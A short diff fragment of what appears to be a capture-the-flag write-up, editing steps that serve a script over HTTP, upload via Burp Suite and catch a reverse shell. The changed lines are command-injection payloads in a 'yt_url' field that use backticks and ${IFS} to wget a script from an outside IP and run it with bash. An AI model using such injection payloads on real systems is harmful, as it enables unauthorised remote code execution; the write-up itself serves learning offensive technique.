@@ -130,9 +130,9 @@ Serving HTTP on 0.0.0.0 port 444 (http://0.0.0.0:444/) ...
 
 4. Upload it using burpsuite and run it another time. 
 ```
-yt_url=`wget${IFS}http://10.8.159.78:444/script.sh
+yt_url=`wget${IFS}http://10.8.159.78:444/script.sh'
 
-yt_url=`bash${IFS}script.s
+yt_url=`bash${IFS}script.s'
 ```
 
 5. Listened in another terminal and make it interactive. 
